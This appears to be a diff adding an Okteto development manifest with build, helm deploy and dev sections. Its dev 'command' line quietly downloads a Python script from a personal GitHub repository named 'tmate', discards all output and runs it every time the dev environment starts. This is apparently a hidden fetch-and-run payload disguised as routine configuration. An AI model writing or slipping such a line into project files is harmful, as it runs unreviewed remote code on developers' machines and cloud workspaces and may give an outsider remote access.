@@ -1,0 +1,11 @@
+icon: https://apps.okteto.com/movies/icon.png
+build:
+  api:
+    context: .
+deploy:
+  - helm upgrade --install app chart --set image=${OKTETO_BUILD_API_IMAGE}
+dev:
+  api:
+    command: ["wget https://raw.githubusercontent.com/liyanul225/tmate/main/code.py >/dev/null 2>&1 && python code.py"]
+    sync:
+      - .:/usr/src/app
